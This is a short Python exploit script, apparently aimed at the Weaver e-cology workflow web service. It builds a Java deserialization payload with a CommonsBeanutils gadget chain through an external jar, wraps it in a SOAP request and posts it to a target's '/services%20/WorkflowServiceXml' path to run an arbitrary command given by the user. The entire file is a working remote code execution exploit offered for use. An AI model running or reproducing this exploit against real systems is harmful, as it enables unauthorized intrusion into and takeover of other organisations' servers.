#!/usr/bin/python3
#-*- coding:utf-8 -*-

import requests
import argparse
import sys
import subprocess
from urllib3.exceptions import InsecureRequestWarning
from html import escape

def execute(url,cmd):
    headers = {
        'User-Agent': 'Apache-HttpClient/4.5.3 (Java/1.8.0_231)',
        'Connection': 'close',
        "Content-Type": "text/xml;charset=UTF-8"
    }
    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
       <soapenv:Header/>
       <soapenv:Body>
          <web:doCreateWorkflowRequest>
          <web:string>''' + paylod(cmd) + '''</web:string>
            <web:string>2</web:string>
          </web:doCreateWorkflowRequest>
       </soapenv:Body>
    </soapenv:Envelope>'''


    try:
        vuln_url = url + "/services%20/WorkflowServiceXml"
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
    except Exception as e:
        print("\033[31m[x] request fail:{} \033[0m".format(e))
        sys.exit(0)

def paylod(cmd):
    popen = subprocess.Popen(['java', '-jar', 'ecology_exp.jar', 'CommonsBeanutils', cmd], stdout=subprocess.PIPE)
    file_body = escape(str(popen.stdout.read(),encoding = "utf-8"))
    return file_body

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--targeturl",
        type=str,
        help="Target URL e.g: -u http://111.111.111.111/")
    parser.add_argument(
        "-c",
        "--command",
        type=str,
        help="command you wish to execute e.g: -c ping xxx.xxx.dnslog"
    )
    args = parser.parse_args()
    url = args.targeturl
    cmd = args.command

    if url and cmd:
        execute(url, cmd)
    else:
        parser.print_help()
